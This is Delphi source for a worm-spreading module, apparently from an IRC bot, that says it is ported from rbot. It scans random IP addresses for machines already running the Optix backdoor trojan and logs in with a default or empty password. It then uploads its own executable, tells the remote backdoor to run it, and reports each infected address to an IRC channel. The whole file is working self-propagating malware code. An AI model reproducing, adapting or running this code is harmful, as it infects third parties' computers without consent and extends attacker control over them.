(* ported from rbot by p0ke *)
Unit optix_spreader;

interface

{$DEFINE Stats}

uses
  Windows, Winsock{$IFDEF Stats}, stats_spreader{$ENDIF};
  
  Procedure StartOptix(NumberOfThreads:WORD);
  
implementation

type 
  TOptix = Class(TObject)
  Private
    szBuffer		:Array[0..64]   Of Char;
    szFilePath		:String;
    
    Read		:Cardinal; // Should be 0
    WSAData		:TWSAData;
    UPLData		:TWSAData;
    Addr		:TSockAddrIn;
    Upl			:TSockAddrIn;
    Sock		:TSocket;
    uSock		:TSocket;
    
    IS11		:Bool; // should be False
    Temp		:String;
    F			:THandle;
    hFile		:THandle;
    dwSize		:DWord;

    szAddress		:String;
    
    Function GetRandomIP: String;
    Function InttoStr(const Value: integer): string;
  Public
    Procedure StartOptix;
  end;

Function TOptix.InttoStr(const Value: Integer): String;
Var
  S: String[11];
Begin
  Str(Value, S);
  Result := S;
End;
  
Function TOptix.GetRandomIP: String;
Var
  ClassA	:Integer;
  ClassB	:Integer;
  ClassC	:Integer;
  ClassD	:Integer;
Begin
  Randomize;
  ClassA := Random(222)+1;
  ClassB := Random(255);
  ClassC := Random(255);
  ClassD := Random(255);

  Result := IntToStr(ClassA) + '.' +
            IntToStr(ClassB) + '.' +
            IntToStr(ClassC) + '.' +
            IntToStr(ClassD);
End;

Procedure TOptix.StartOptix;
Label
  Start, Rewind;
Begin
Rewind:
  Read := 0;
  IS11 := False;

  szAddress := GetRandomIP;
  
  If (WSAStartUp(MakeWord(2,2), WSAData) <> 0) Then Goto Rewind;
  
  Addr.sin_addr.s_addr := inet_addr(pchar(szAddress));
  Addr.sin_port := hTons(3140);
  Addr.sin_family := AF_INET;
  
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  
  If (Sock = INVALID_SOCKET) Then Goto Rewind;
  
Start:
  If (Connect(Sock, Addr, SizeOf(Addr)) = SOCKET_ERROR) Then
  Begin
    CloseSocket(Sock);
    WSACleanUp;
    Goto ReWind;
  End;
  
  // Auth ourself.
  // Note: OPTIX Blocks your connection if you fail the password three times
  
  If (IS11) Then
    Temp := '022¬OPTest¬v1.1'#13#10
  Else
    Temp := '022¬OPTest¬v1.2'#13#10;
  
  Send(Sock, Temp[1], Length(Temp), 0);
  Sleep(500);
  
  FillChar(szBuffer, SizeOf(szBuffer), #0);
  Recv(Sock, szBuffer, SizeOf(szBuffer), 0);
  
  If (Pos('001¬Your client version is outdated!',String(szBuffer)) > 0) Then
  Begin
    IS11 := True;
    CloseSocket(Sock);
    Goto Start;
  End;
  
  If (Pos('001¬', String(szBuffer)) > 0) Then
  Begin
    Sleep(500);
    // IF "OPTest" doesnt work, Try a empty password.
    
    If (IS11) Then
      Temp := '022¬¬v1.1'#13#10
    Else
      Temp := '022¬¬v1.2'#13#10;
    Send(Sock, Temp[1], Length(Temp), 0);
    Sleep(500);
    
    FillChar(szBuffer, SizeOf(szBuffer), #0);
    Recv(Sock, szBuffer, SizeOf(szBuffer), 0);
    
    If (Pos('011¬', String(szBuffer)) > 0) Then
    Begin
      CloseSocket(Sock);
      WSACleanUp;
      Goto Rewind;
    End;
  End;
  
  Temp := '019¬'#13#10;
  Send(Sock, Temp[1], 6, 0);
  Sleep(500);
  
  FillChar(szBuffer, SizeOf(szBuffer), #0);
  Recv(Sock, szBuffer, SizeOf(szBuffer), 0);
  
  If (Pos('020¬'#13#10, String(szBuffer)) > 0) Then
  Begin
    CloseSocket(Sock);
    WSACleanUp;
    Goto Rewind;
  End;
  
  
  
  szFilePath := ParamStr(0);
  
  F := CreateFile  (pChar(szFilePath),
                    GENERIC_READ,
                    FILE_SHARE_READ,
                    NIL,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    0);
  
  If (WSAStartUp(MakeWord(2,2), UPLData) <> 0) Then
  Begin
    CloseSocket(Sock);
    WSACleanUp;
    Goto Rewind;
  End;
  
  UPL.Sin_Addr.s_addr := inet_addr(pchar(szAddress));
  UPL.Sin_Port := hTons(500);
  UPL.Sin_Family := AF_INET;
  
  uSock := Socket(AF_INET, SOCK_STREAM, 0);
  
  If (uSock = INVALID_SOCKET) Then
  Begin
    CloseSocket(Sock);
    WSACleanUp;
    Goto Rewind;
  End;
  
  If (Connect(uSock, UPL, SizeOf(UPL)) = SOCKET_ERROR) Then
  Begin
    CloseSocket( Sock);
    CloseSocket(uSock);
    WSACleanUp;
    Goto Rewind;
  End;
  
  hFile := CreateFile(pChar(szFilePath), 
                      GENERIC_READ,
                      FILE_SHARE_READ,
                      NIL,
                      OPEN_EXISTING,
                      FILE_ATTRIBUTE_NORMAL,
                      0);
  dwSize := GetFileSize(hFile, NIL);
  CloseHandle(hFile);
  
  Temp := 'C:\one2three4five6.exe'#13#10+IntToStr(dwSize)+#13#10;
  Send(uSock, Temp[1], Length(Temp), 0);
  
  Sleep(500);
  
  FillChar(szBuffer, SizeOf(szBuffer), #0);
  Recv(uSock, Temp[1], Length(Temp), 0);
  
  If (Pos('+OK REDY', String(szBuffer)) = 0) THen
  Begin
    CloseSocket( Sock);
    CloseSocket(uSock);
    WSACleanUp;
    Goto Rewind;
  End;
  
  FillChar(szBuffer, SizeOf(szBuffer), #0);
  
  Read := 0;
  Repeat
    ReadFile(F, szBuffer, SizeOf(szBuffer), Read, NIL);
    Send(uSock, szBuffer, Read, 0);
  Until (Read = 0);
  CloseHandle(F);
  
  FillChar(szBuffer, SizeOf(szBuffer), #0);
  Recv(uSock, szBuffer, SizeOf(szBuffer), 0);
  
  If (Pos('+OK RCVD', String(szBuffer)) > 0) Then
  Begin
    CloseSocket(uSock);
    
    Temp := '008¬C:\one2three4five6.exe'#13#10;
    Send(Sock, Temp[1], Length(Temp), 0);
    
    Sleep(500);
    
    FillChar(szBuffer, SizeOf(szBuffer), #0);
    Recv(Sock, szBuffer, SizeOf(szBuffer), 0);
    
    If (String(szBuffer) = '001¬Error Executing File'#13#10) Then
    Begin
      CloseSocket( Sock);
      CloseSocket(uSock);
      WSACleanUp;
      Goto Rewind;
    End;
  End Else
  Begin
    CloseSocket( Sock);
    CloseSocket(uSock);
    WSACleanUp;
    Exit;
  End;
  
  Temp := '100¬'#13#10;
  Send(Sock, Temp[1], Length(Temp), 0);
  CloseSocket( Sock);
  CloseSocket(uSock);
  WSACleanUp;

  {$IFDEF Stats}
    Inc(Optix_Infect);
    Bot.SendRAW('PRIVMSG '+Bot.Channel+' :[op:'+szAddress+']'#10);
  {$ENDIF}
End;

PROCEDURE StartRandomThread;
VAR
  Optix : TOptix;
BEGIN
  Optix := TOptix.Create;
  Optix.StartOptix;
END;

Procedure StartOptix(NumberOfThreads:WORD);
Var
  ThreadID: DWord;
  I	  : Integer;
Begin
  For I := 0 To NumberOfThreads-1 Do
    BeginThread(NIL, 0, @StartRandomThread, NIL, 0, ThreadID);
End;

End.